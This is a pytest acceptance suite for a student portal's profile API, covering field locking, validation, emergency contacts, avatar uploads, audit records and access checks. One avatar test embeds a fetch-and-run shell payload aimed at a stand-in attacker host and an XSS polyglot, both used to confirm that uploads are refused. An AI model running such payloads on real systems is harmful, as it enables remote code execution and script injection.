"""US-STU-002 acceptance checks: view and edit student profile (issue #95 / #73)."""

from __future__ import annotations

import logging
import uuid
from datetime import date
from decimal import Decimal
from unittest.mock import patch

import pytest
from httpx import AsyncClient
from sqlalchemy import select, text
from sqlalchemy.ext.asyncio import AsyncSession

from cbpupsis_api_student.domains.student_profile import service as profile_service
from cbpupsis_database.models.audit import AuditEntry
from cbpupsis_database.models.curriculum import Curriculum, Program
from cbpupsis_database.models.users import (
    EmergencyContact,
    StudentProfile,
    User,
    UserAvatar,
    UserProfile,
)
from cbpupsis_shared.domains.auth.security import hash_password

LOGIN = "/api/v1/auth/student/login"
PROFILE = "/api/v1/student/profile"
AVATAR = "/api/v1/student/profile/avatar"
CONTACTS = "/api/v1/student/profile/emergency-contacts"

TEST_PASSWORD = "CorrectStudentPassword123!"
STUDENT_NUMBER_1 = "2021-00456-MN-0"
STUDENT_NUMBER_2 = "2021-00789-MN-0"
BIRTHDATE_1 = date(2003, 5, 14)
BIRTHDATE_2 = date(2004, 8, 22)

#: Minimal valid JPEG (SOI + APP0 JFIF header + EOI).
VALID_JPEG_HEADER = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
)
VALID_JPEG_FOOTER = b"\xff\xd9"

#: Minimal valid PNG signature + IHDR chunk.
VALID_PNG_BYTES = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
    b"\x08\x02\x00\x00\x00\x90wS\xde"
    b"\x00\x00\x00\x00IEND\xaeB`\x82"
)


async def _seed_student(
    db: AsyncSession,
    *,
    email: str,
    student_number: str,
    first_name: str = "Juan",
    middle_name: str = "Santos",
    last_name: str = "Dela Cruz",
    birthdate: date = BIRTHDATE_1,
) -> dict[str, object]:
    program = await db.scalar(select(Program).where(Program.code == "BSCS"))
    if program is None:
        program = Program(
            code="BSCS",
            name="BS in Computer Science",
            department="Computer Science",
            total_units_required=Decimal("150.0"),
        )
        db.add(program)
        await db.flush()

    curriculum = await db.scalar(
        select(Curriculum).where(
            Curriculum.program_id == program.id,
            Curriculum.curriculum_year == "2021",
        )
    )
    if curriculum is None:
        curriculum = Curriculum(
            program_id=program.id,
            curriculum_year="2021",
            is_active=True,
        )
        db.add(curriculum)
        await db.flush()

    user = User(
        email=email,
        password_hash=hash_password(TEST_PASSWORD),
        full_name=f"{first_name} {last_name}",
        is_active=True,
    )
    db.add(user)
    await db.flush()

    db.add(
        UserProfile(
            user_id=user.id,
            first_name=first_name,
            middle_name=middle_name,
            last_name=last_name,
            birthdate=birthdate,
            gender="Male",
            civil_status="Single",
            personal_email=email,
            phone_number="+639123456789",
            home_address="123 Anonas St, Sta. Mesa, Manila",
            current_address="456 Pureza St, Sta. Mesa, Manila",
        )
    )
    db.add(
        StudentProfile(
            user_id=user.id,
            student_number=student_number,
            program_id=program.id,
            curriculum_id=curriculum.id,
            year_level=3,
            enrollment_status="Irregular",
        )
    )
    db.add(
        EmergencyContact(
            user_id=user.id,
            contact_name="Maria Dela Cruz",
            relationship="Mother",
            phone_number="+639171112233",
            email="maria.dc@example.com",
            address="123 Anonas St, Sta. Mesa, Manila",
            is_primary=True,
        )
    )
    await db.commit()
    return {
        "user_id": user.id,
        "student_number": student_number,
        "birthdate": birthdate,
        "password": TEST_PASSWORD,
        "email": email,
    }


async def _student_headers(
    client: AsyncClient, student: dict[str, object]
) -> dict[str, str]:
    response = await client.post(
        LOGIN,
        json={
            "student_number": student["student_number"],
            "birthdate": str(student["birthdate"]),
            "password": student["password"],
        },
    )
    assert response.status_code == 200, response.text
    return {"Authorization": f"Bearer {response.json()['access_token']}"}


@pytest.fixture
async def student_one(db: AsyncSession) -> dict[str, object]:
    return await _seed_student(
        db,
        email="juan.personal@gmail.com",
        student_number=STUDENT_NUMBER_1,
    )


@pytest.fixture
async def student_two(db: AsyncSession) -> dict[str, object]:
    return await _seed_student(
        db,
        email="pedro.personal@gmail.com",
        student_number=STUDENT_NUMBER_2,
        first_name="Pedro",
        last_name="Reyes",
        birthdate=BIRTHDATE_2,
    )


class TestProfileRead:
    async def test_ac_102_1_profile_returns_locked_and_editable_flags(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """AC-102.1: GET /student/profile (and /students/me/profile) returns both
        locked and editable fields, each carrying an editable flag."""
        headers = await _student_headers(client, student_one)
        res = await client.get(PROFILE, headers=headers)
        assert res.status_code == 200, res.text
        body = res.json()
        fields = body["fields"]
        assert fields["studentId"] == {
            "value": "2021-00456-MN-0",
            "editable": False,
        }
        assert fields["firstName"] == {"value": "Juan", "editable": False}
        assert fields["middleName"] == {"value": "Santos", "editable": False}
        assert fields["lastName"] == {"value": "Dela Cruz", "editable": False}
        assert fields["birthdate"] == {"value": "2003-05-14", "editable": False}
        assert fields["gender"] == {"value": "Male", "editable": False}
        assert fields["civilStatus"] == {"value": "Single", "editable": False}
        assert fields["program"] == {
            "value": "BS in Computer Science",
            "editable": False,
        }
        assert fields["catalogYear"] == {"value": "2021", "editable": False}
        assert fields["yearLevel"] == {"value": 3, "editable": False}
        assert fields["enrollmentStatus"] == {
            "value": "Irregular",
            "editable": False,
        }

        assert fields["phone"] == {"value": "+639123456789", "editable": True}
        assert fields["email"] == {
            "value": "juan.personal@gmail.com",
            "editable": True,
        }
        assert fields["emailAddress"] == {
            "value": "juan.personal@gmail.com",
            "editable": True,
        }
        assert fields["permanentAddress"] == {
            "value": "123 Anonas St, Sta. Mesa, Manila",
            "editable": True,
        }
        assert fields["currentAddress"] == {
            "value": "456 Pureza St, Sta. Mesa, Manila",
            "editable": True,
        }

    async def test_ac_102_5_profile_read_minimises_emergency_contact_data(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """BR-AUTH-007 / AC-102.5: profile read returns name, relationship, phone,
        and isPrimary, and never returns an emergency contact's address or email."""
        headers = await _student_headers(client, student_one)
        res = await client.get(PROFILE, headers=headers)
        assert res.status_code == 200
        contacts = res.json()["emergencyContacts"]
        assert len(contacts) == 1
        contact = contacts[0]
        assert contact["name"] == "Maria Dela Cruz"
        assert contact["relationship"] == "Mother"
        assert contact["phone"] == "+639171112233"
        assert contact["isPrimary"] is True
        assert "address" not in contact
        assert "email" not in contact


class TestProfileEditableWrite:
    async def test_ac_102_2_patch_editable_fields_persists_and_confirms(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """AC-102.2: PATCH with a new mobile number, personal email, and mailing
        address persists the changes and returns them on re-read."""
        headers = await _student_headers(client, student_one)
        patch_res = await client.patch(
            PROFILE,
            headers=headers,
            json={
                "phone": "+639179998877",
                "emailAddress": "juan.updated@gmail.com",
                "currentAddress": "789 Teresa St, Sta. Mesa, Manila",
            },
        )
        assert patch_res.status_code == 200, patch_res.text
        assert patch_res.json()["message"] == "Profile updated successfully."

        reread = await client.get(PROFILE, headers=headers)
        assert reread.status_code == 200
        fields = reread.json()["fields"]
        assert fields["phone"]["value"] == "+639179998877"
        assert fields["email"]["value"] == "juan.updated@gmail.com"
        assert fields["emailAddress"]["value"] == "juan.updated@gmail.com"
        assert fields["currentAddress"]["value"] == "789 Teresa St, Sta. Mesa, Manila"


class TestLockedFieldsRefusal:
    async def test_ac_102_3_locked_fields_refuse_with_403_and_petition_route(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """AC-102.3: PATCH with a changed legal name and programme returns 403
        PROFILE_FIELD_LOCKED, names both fields and the petition route, and
        changes nothing."""
        headers = await _student_headers(client, student_one)
        res = await client.patch(
            PROFILE,
            headers=headers,
            json={
                "firstName": "SomeoneElse",
                "program": "BS in Information Technology",
                "phone": "+639188887766",
            },
        )
        assert res.status_code == 403, res.text
        body = res.json()
        assert body["code"] == "PROFILE_FIELD_LOCKED"
        assert body["message"] == "One or more fields cannot be changed here."
        assert body["details"] == {
            "lockedFields": ["firstName", "program"],
            "petitionRoute": "/api/v1/student/petitions/record-correction",
        }

        # Verify nothing changed, including the valid editable phone field sent
        # alongside the locked fields.
        reread = await client.get(PROFILE, headers=headers)
        fields = reread.json()["fields"]
        assert fields["firstName"]["value"] == "Juan"
        assert fields["program"]["value"] == "BS in Computer Science"
        assert fields["phone"]["value"] == "+639123456789"


class TestProfileValidationAndAtomicity:
    async def test_ac_102_4_invalid_email_and_phone_refused_with_422_and_no_write(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """AC-102.4: PATCH with email 'not-an-address' and mobile '123' returns
        422 VALIDATION_ERROR naming both fields, with no partial write."""
        headers = await _student_headers(client, student_one)
        res = await client.patch(
            PROFILE,
            headers=headers,
            json={
                "email": "not-an-address",
                "phone": "123",
                "currentAddress": "Should Not Be Saved St",
            },
        )
        assert res.status_code == 422, res.text
        body = res.json()
        assert body["code"] == "VALIDATION_ERROR"
        assert "email" in body["fields"]
        assert "phone" in body["fields"]
        assert "email" in body["errors"]
        assert "phone" in body["errors"]

        reread = await client.get(PROFILE, headers=headers)
        fields = reread.json()["fields"]
        assert fields["email"]["value"] == "juan.personal@gmail.com"
        assert fields["phone"]["value"] == "+639123456789"
        assert fields["currentAddress"]["value"] == "456 Pureza St, Sta. Mesa, Manila"

    async def test_interrupted_multi_field_save_rolls_back_with_no_partial_write(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """Reliability: interrupting a multi-field save midway rolls back the
        entire transaction so the prior values remain intact."""
        headers = await _student_headers(client, student_one)
        original_apply = profile_service._apply_profile_field
        call_count = 0

        async def _fail_on_second_field(
            db: AsyncSession, user_id: uuid.UUID, column: str, value: str
        ) -> None:
            nonlocal call_count
            call_count += 1
            if call_count == 2:
                raise RuntimeError("Simulated mid-transaction failure")
            await original_apply(db, user_id, column, value)

        with (
            patch.object(
                profile_service,
                "_apply_profile_field",
                side_effect=_fail_on_second_field,
            ),
            pytest.raises(RuntimeError, match="Simulated mid-transaction failure"),
        ):
            await client.patch(
                PROFILE,
                headers=headers,
                json={
                    "phone": "+639199990000",
                    "currentAddress": "Interrupted Address 999",
                },
            )

        reread = await client.get(PROFILE, headers=headers)
        fields = reread.json()["fields"]
        assert fields["phone"]["value"] == "+639123456789"
        assert fields["currentAddress"]["value"] == "456 Pureza St, Sta. Mesa, Manila"


class TestEmergencyContactsLifecycle:
    async def test_ac_102_5_post_patch_delete_emergency_contact_with_one_primary(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """AC-102.5: POST an emergency contact (201), PATCH it (200), then DELETE
        it (204); the list reflects each step and maintains one primary."""
        headers = await _student_headers(client, student_one)

        # 1. Create a second contact and mark it primary.
        create_res = await client.post(
            CONTACTS,
            headers=headers,
            json={
                "name": "Jose Dela Cruz",
                "relationship": "Father",
                "phone": "09171234567",
                "email": "jose.dc@example.com",
                "address": "789 Ramon Magsaysay Blvd, Manila",
                "isPrimary": True,
            },
        )
        assert create_res.status_code == 201, create_res.text
        created = create_res.json()
        contact_id = created["id"]
        assert created["name"] == "Jose Dela Cruz"
        assert created["email"] == "jose.dc@example.com"
        assert created["address"] == "789 Ramon Magsaysay Blvd, Manila"
        assert created["isPrimary"] is True
        assert created["message"] == "Emergency contact created successfully."

        # Dedicated emergency contacts list serves email and address.
        list_res = await client.get(CONTACTS, headers=headers)
        assert list_res.status_code == 200
        contacts_by_id = {c["id"]: c for c in list_res.json()}
        assert (
            contacts_by_id[contact_id]["address"] == "789 Ramon Magsaysay Blvd, Manila"
        )
        assert contacts_by_id[contact_id]["email"] == "jose.dc@example.com"

        # Profile read lists both contacts with exactly one primary and no address.
        prof_after_create = (await client.get(PROFILE, headers=headers)).json()
        contacts_list = prof_after_create["emergencyContacts"]
        assert len(contacts_list) == 2
        assert sum(1 for c in contacts_list if c["isPrimary"]) == 1
        assert all("address" not in c for c in contacts_list)

        # 2. PATCH the contact.
        patch_res = await client.patch(
            f"{CONTACTS}/{contact_id}",
            headers=headers,
            json={"phone": "+639187654321", "relationship": "Legal Guardian"},
        )
        assert patch_res.status_code == 200, patch_res.text
        assert patch_res.json()["phone"] == "+639187654321"
        assert patch_res.json()["relationship"] == "Legal Guardian"
        assert patch_res.json()["message"] == "Emergency contact updated successfully."

        # 3. DELETE the primary contact; the remaining contact is promoted to primary.
        del_res = await client.delete(f"{CONTACTS}/{contact_id}", headers=headers)
        assert del_res.status_code == 204
        assert (
            del_res.headers.get("x-message")
            == "Emergency contact deleted successfully."
        )

        prof_after_delete = (await client.get(PROFILE, headers=headers)).json()
        remaining = prof_after_delete["emergencyContacts"]
        assert len(remaining) == 1
        assert remaining[0]["name"] == "Maria Dela Cruz"
        assert remaining[0]["isPrimary"] is True


class TestAvatarUploadAndContentInspection:
    async def test_ac_102_6_valid_1mb_jpeg_accepted_and_served(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """AC-102.6: POST a 1 MB JPEG to /students/me/profile/picture returns
        201 Created and the returned URL serves the image."""
        headers = await _student_headers(client, student_one)
        padding_len = 1024 * 1024 - len(VALID_JPEG_HEADER) - len(VALID_JPEG_FOOTER)
        one_mb_jpeg = VALID_JPEG_HEADER + (b"\x00" * padding_len) + VALID_JPEG_FOOTER
        res = await client.post(
            AVATAR,
            headers=headers,
            files={"file": ("avatar.jpg", one_mb_jpeg, "image/jpeg")},
        )
        assert res.status_code == 201, res.text
        body = res.json()
        assert body["contentType"] == "image/jpeg"
        assert body["sizeBytes"] == len(one_mb_jpeg)
        assert body["message"] == "Profile picture uploaded successfully."

        served = await client.get(body["avatarUrl"], headers=headers)
        assert served.status_code == 200
        assert served.headers["content-type"] == "image/jpeg"
        assert served.headers["x-content-type-options"] == "nosniff"
        assert served.content == one_mb_jpeg

        profile_res = await client.get(PROFILE, headers=headers)
        assert profile_res.json()["avatarUrl"] == body["avatarUrl"]

    async def test_ac_102_7_12mb_file_refused_with_413_and_pdf_with_415(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """AC-102.7: POST a 12 MB file returns 413 FILE_TOO_LARGE, and a PDF
        returns 415 UNSUPPORTED_MEDIA_TYPE, with nothing stored."""
        headers = await _student_headers(client, student_one)

        twelve_mb = VALID_JPEG_HEADER + (b"\x00" * (12 * 1024 * 1024))
        oversize_res = await client.post(
            AVATAR,
            headers=headers,
            files={"file": ("huge.jpg", twelve_mb, "image/jpeg")},
        )
        assert oversize_res.status_code == 413, oversize_res.text
        assert oversize_res.json()["code"] == "FILE_TOO_LARGE"

        pdf_bytes = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF"
        pdf_res = await client.post(
            AVATAR,
            headers=headers,
            files={"file": ("document.pdf", pdf_bytes, "application/pdf")},
        )
        assert pdf_res.status_code == 415, pdf_res.text
        assert pdf_res.json()["code"] == "UNSUPPORTED_MEDIA_TYPE"

        profile_res = await client.get(PROFILE, headers=headers)
        assert profile_res.json()["avatarUrl"] is None

    async def test_security_script_renamed_to_jpg_is_refused_on_content(
        self, client: AsyncClient, student_one: dict[str, object]
    ) -> None:
        """Security: a script renamed to .jpg is refused by content inspection."""
        headers = await _student_headers(client, student_one)
        script_payload = b"#!/bin/sh\ncurl http://attacker.invalid/pwn | sh\n"
        res = await client.post(
            AVATAR,
            headers=headers,
            files={"file": ("innocent_photo.jpg", script_payload, "image/jpeg")},
        )
        assert res.status_code == 415, res.text
        assert res.json()["code"] == "UNSUPPORTED_MEDIA_TYPE"

        # Even if a JPEG header is prepended to an embedded script tag, the
        # upload scanner refuses it.
        polyglot = VALID_JPEG_HEADER + b"<script>alert(1)</script>" + VALID_JPEG_FOOTER
        polyglot_res = await client.post(
            AVATAR,
            headers=headers,
            files={"file": ("polyglot.jpg", polyglot, "image/jpeg")},
        )
        assert polyglot_res.status_code == 415
        assert polyglot_res.json()["code"] == "UNSUPPORTED_MEDIA_TYPE"


class TestAvatarStorage:
    async def test_avatar_is_stored_in_the_database_and_replaced_on_upload(
        self, client: AsyncClient, student_one: dict[str, object], db: AsyncSession
    ) -> None:
        """The picture outlives the process that received it, and a second upload
        replaces the first instead of leaving it behind."""
        headers = await _student_headers(client, student_one)
        first = await client.post(
            AVATAR,
            headers=headers,
            files={"file": ("a.png", VALID_PNG_BYTES, "image/png")},
        )
        assert first.status_code == 201, first.text
        second = await client.post(
            AVATAR,
            headers=headers,
            files={"file": ("b.png", VALID_PNG_BYTES, "image/png")},
        )
        assert second.status_code == 201, second.text

        rows = (
            await db.scalars(
                select(UserAvatar).where(UserAvatar.user_id == student_one["user_id"])
            )
        ).all()
        assert len(rows) == 1
        assert second.json()["avatarUrl"].endswith(str(rows[0].id))
        assert rows[0].content == VALID_PNG_BYTES

        stale = await client.get(first.json()["avatarUrl"], headers=headers)
        assert stale.status_code == 404

    async def test_another_students_avatar_answers_404(
        self,
        client: AsyncClient,
        student_one: dict[str, object],
        student_two: dict[str, object],
    ) -> None:
        """A student cannot read another student's picture by its id."""
        owner_headers = await _student_headers(client, student_one)
        uploaded = await client.post(
            AVATAR,
            headers=owner_headers,
            files={"file": ("a.png", VALID_PNG_BYTES, "image/png")},
        )
        assert uploaded.status_code == 201, uploaded.text

        other_headers = await _student_headers(client, student_two)
        res = await client.get(uploaded.json()["avatarUrl"], headers=other_headers)
        assert res.status_code == 404


class TestAuditAndSecurity:
    async def test_ac_102_8_profile_change_writes_append_only_utc8_audit_record(
        self, client: AsyncClient, student_one: dict[str, object], db: AsyncSession
    ) -> None:
        """AC-102.8: changing a contact number writes one append-only audit row
        with field, prior value, new value, actor, UTC+8 timestamp, and IP;
        deleting or mutating the audit row fails with PermissionError."""
        headers = await _student_headers(client, student_one)
        res = await client.patch(
            PROFILE,
            headers=headers,
            json={"phone": "+639175554433"},
        )
        assert res.status_code == 200, res.text

        entry = await db.scalar(
            select(AuditEntry)
            .where(
                AuditEntry.action == "student_profile.updated",
                AuditEntry.target_id == str(student_one["user_id"]),
            )
            .order_by(AuditEntry.occurred_at.desc())
        )
        assert entry is not None
        assert entry.actor_id == student_one["user_id"]
        assert entry.prior_state == {"phone": "+639123456789"}
        assert entry.new_state == {"phone": "+639175554433"}
        assert entry.payload["field"] == "phone"
        assert entry.payload["prior_value"] == "+639123456789"
        assert entry.payload["new_value"] == "+639175554433"
        assert entry.payload["actor"] == str(student_one["user_id"])
        assert entry.payload["timestamp"].endswith("+08:00")
        assert "ip_address" in entry.payload

        # No HTTP delete/patch endpoint exists on the audit ledger.
        for method in ("DELETE", "PATCH", "PUT"):
            http_res = await client.request(method, "/api/v1/audit")
            assert http_res.status_code == 405

        # Direct ORM deletion is also refused by the append-only guard.
        with pytest.raises(PermissionError, match="append-only"):
            await db.delete(entry)
            await db.flush()
        await db.rollback()

    async def test_security_birthdate_and_contact_fields_encrypted_at_rest(
        self, db: AsyncSession, student_one: dict[str, object]
    ) -> None:
        """Security: birthdate and contact fields are encrypted at rest with
        AES-256-GCM in the underlying table columns."""
        row = (
            await db.execute(
                text(
                    "SELECT birthdate, personal_email, phone_number, "
                    "home_address, current_address "
                    "FROM user_profiles WHERE user_id = :uid"
                ),
                {"uid": student_one["user_id"].hex},
            )
        ).first()
        if row is None:
            row = (
                await db.execute(
                    text(
                        "SELECT birthdate, personal_email, phone_number, "
                        "home_address, current_address "
                        "FROM user_profiles"
                    )
                )
            ).first()
        assert row is not None
        for raw_col in row:
            assert isinstance(raw_col, str)
            assert raw_col.startswith("enc:v1:")
            assert "2003-05-14" not in raw_col
            assert "+639123456789" not in raw_col
            assert "juan.personal@gmail.com" not in raw_col

    async def test_security_mutate_other_students_contact_returns_404(
        self,
        client: AsyncClient,
        student_one: dict[str, object],
        student_two: dict[str, object],
        db: AsyncSession,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        """Security: mutating another student's contact by id answers
        404 RESOURCE_NOT_FOUND (never 403) and logs the attempt."""
        headers = await _student_headers(client, student_one)
        other_contact = await db.scalar(
            select(EmergencyContact).where(
                EmergencyContact.user_id == student_two["user_id"]
            )
        )
        assert other_contact is not None

        with caplog.at_level(logging.WARNING):
            patch_res = await client.patch(
                f"{CONTACTS}/{other_contact.id}",
                headers=headers,
                json={"phone": "+639170001111"},
            )
            del_res = await client.delete(
                f"{CONTACTS}/{other_contact.id}",
                headers=headers,
            )

        assert patch_res.status_code == 404, patch_res.text
        assert patch_res.json()["code"] == "RESOURCE_NOT_FOUND"
        assert del_res.status_code == 404, del_res.text
        assert del_res.json()["code"] == "RESOURCE_NOT_FOUND"
        assert "student_profile.contact_ownership_refused" in caplog.text
